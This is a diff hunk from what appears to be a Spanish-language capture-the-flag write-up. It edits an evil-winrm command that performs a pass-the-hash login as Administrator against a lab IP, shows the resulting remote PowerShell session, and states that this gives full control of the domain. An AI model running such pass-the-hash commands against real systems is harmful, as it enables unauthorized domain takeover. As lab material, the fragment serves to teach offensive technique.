@@ -629,7 +629,7 @@ Credentials:
 Y con ello, sólo tenemos que hacer _Pass The Hash_ y estamos servidor con un control total sobre el dominio:
 
 ```js
-❯ evil-winrm -H 5917507bdf2ef2c2b0a869a1cba40726 -u Administrator -i 10.10.11.89
+❯ evil-winrm -H 5917517bdf2ef0c2b0a869a1cca40726 -u Administrator -i 10.10.11.89
 <SNIP!>
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
